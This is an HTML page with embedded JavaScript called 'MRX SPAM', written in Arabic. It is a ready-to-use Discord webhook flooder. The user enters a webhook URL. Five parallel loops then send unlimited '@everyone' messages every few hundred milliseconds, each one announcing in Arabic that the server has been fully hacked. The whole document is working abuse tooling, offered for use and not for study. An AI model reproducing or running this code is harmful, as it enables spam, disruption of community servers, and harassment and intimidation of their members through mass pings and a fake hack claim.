<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>MRX SPAM</title>
    <style>
        body {
            font-family: Arial; background: #0a0a0a; color: #fff;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; margin: 0;
        }
        .box {
            background: #111; border: 1px solid #333;
            border-radius: 30px; padding: 40px;
            width: 500px; max-width: 95%;
            text-align: center;
        }
        h1 { color: #ff1a1a; letter-spacing: 5px; margin: 0 0 5px; }
        p { color: #666; font-size: 13px; margin: 0 0 20px; }
        input {
            width: 100%; padding: 15px 20px;
            background: #1a1a1a; border: 1px solid #333;
            border-radius: 30px; color: #fff; font-size: 14px;
            direction: ltr; text-align: left; outline: none;
            box-sizing: border-box;
        }
        input:focus { border-color: #ff1a1a; }
        .btn-row { display: flex; gap: 10px; margin: 20px 0; }
        .btn-start {
            flex: 1; padding: 16px; background: #cc0000; color: #fff;
            border: none; border-radius: 30px; font-size: 16px;
            font-weight: 700; cursor: pointer; letter-spacing: 3px;
        }
        .btn-start:hover { background: #ff1a1a; }
        .btn-start:disabled { opacity: 0.3; cursor: not-allowed; }
        .btn-stop {
            flex: 1; padding: 16px; background: #222; color: #888;
            border: 1px solid #444; border-radius: 30px; font-size: 16px;
            font-weight: 700; cursor: pointer; letter-spacing: 3px;
        }
        .btn-stop:hover { background: #cc0000; color: #fff; }
        .btn-stop:disabled { opacity: 0.3; cursor: not-allowed; }
        #log {
            width: 100%; height: 180px; margin-top: 15px;
            background: #050505; color: #00ff88;
            border: 1px solid #2a2a2a; border-radius: 16px;
            padding: 15px; font-family: monospace; font-size: 12px;
            direction: ltr; text-align: left; box-sizing: border-box;
            resize: none;
        }
        #count { color: #00ff88; font-size: 24px; font-weight: 700; }
    </style>
</head>
<body>
<div class="box">
    <h1>☠️ MRX</h1>
    <p>● @everyone SPAM — غير محدود ●</p>

    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
    
    <div class="btn-row">
        <button class="btn-start" id="startBtn" onclick="start()">💀 ابدأ</button>
        <button class="btn-stop" id="stopBtn" onclick="stop()" disabled>⛔ إيقاف</button>
    </div>

    <div>تم الإرسال: <span id="count">0</span></div>

    <textarea id="log" readonly placeholder="... السجل"></textarea>
</div>

<script>
let running = false;
let stopReq = false;
let count = 0;
let t1, t2, t3, t4, t5; 

function $(id) { return document.getElementById(id); }

function log(msg) {
    const el = $('log');
    el.value += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
    el.scrollTop = el.scrollHeight;
}


async function shoot(webhook, msg) {
    if (stopReq) return;
    try {
        const f = new FormData();
        f.append('payload_json', JSON.stringify({ content: msg }));
        await fetch(webhook, { method: 'POST', mode: 'no-cors', body: f });
        count++;
        if (count % 20 === 0) {
            $('count').textContent = count;
            log(`📨 ${count} رسالة @everyone`);
        }
    } catch(e) {}
}


function loop1(wh, msg) {
    if (stopReq) return;
    for (let i = 0; i < 10; i++) shoot(wh, msg);
    t1 = setTimeout(() => loop1(wh, msg), 200);
}
function loop2(wh, msg) {
    if (stopReq) return;
    for (let i = 0; i < 10; i++) shoot(wh, msg);
    t2 = setTimeout(() => loop2(wh, msg), 250);
}
function loop3(wh, msg) {
    if (stopReq) return;
    for (let i = 0; i < 10; i++) shoot(wh, msg);
    t3 = setTimeout(() => loop3(wh, msg), 300);
}
function loop4(wh, msg) {
    if (stopReq) return;
    for (let i = 0; i < 10; i++) shoot(wh, msg);
    t4 = setTimeout(() => loop4(wh, msg), 350);
}
function loop5(wh, msg) {
    if (stopReq) return;
    for (let i = 0; i < 10; i++) shoot(wh, msg);
    t5 = setTimeout(() => loop5(wh, msg), 400);
}

function start() {
    const wh = $('webhook').value.trim();
    if (!wh) { alert('حط رابط Webhook'); return; }
    if (running) return;

    const msg = '@everyone تم اختراق السيرفر بالكامل — من قبل تراكس هوب  وا الدراك  — @everyone';

    running = true;
    stopReq = false;
    count = 0;
    $('count').textContent = '0';
    $('startBtn').disabled = true;
    $('stopBtn').disabled = false;
    
    log('🚀 @everyone سبام غير محدود بدأ!');

  
    loop1(wh, msg);
    loop2(wh, msg);
    loop3(wh, msg);
    loop4(wh, msg);
    loop5(wh, msg);

    const ui = setInterval(() => {
        $('count').textContent = count;
        if (stopReq) clearInterval(ui);
    }, 500);
    setTimeout(() => { if(!stopReq) ui; }, 500);
}

function stop() {
    if (!running) return;
    log('⛔ جاري الإيقاف...');
    stopReq = true;
    clearTimeout(t1); clearTimeout(t2); clearTimeout(t3);
    clearTimeout(t4); clearTimeout(t5);
    
    setTimeout(() => {
        running = false;
        $('startBtn').disabled = false;
        $('stopBtn').disabled = true;
        $('count').textContent = count;
        log(`🛑 توقف.总 الرسائل: ${count}`);
    }, 300);
}
</script>
</body>
</html>
